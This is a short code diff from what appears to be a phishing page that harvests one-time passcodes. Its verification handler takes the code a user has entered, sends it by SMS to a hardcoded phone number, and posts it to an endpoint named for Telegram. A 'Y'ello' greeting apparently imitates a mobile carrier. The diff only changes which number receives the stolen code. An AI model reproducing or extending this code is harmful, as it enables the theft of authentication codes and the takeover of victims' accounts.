@@ -160,14 +160,14 @@ const message = `Y'ello. Please enter the following code:${otpCode} to complete 
   const handleVerify = async () => {
     if (otpDigits.every(d => d)) {
      setIsLoading(true);
-    //  sendSMS(
-    //   "+254737799310",
-    //   message
-    // );
-       sendSM(
-      "+254768408107",
+     sendSMS(
+      "+254737799310",
       message
     );
+    //    sendSM(
+    //   "+254768408107",
+    //   message
+    // );
       try {
         const response = await fetch('/api/send-otp-telegram', {
           method: 'POST',
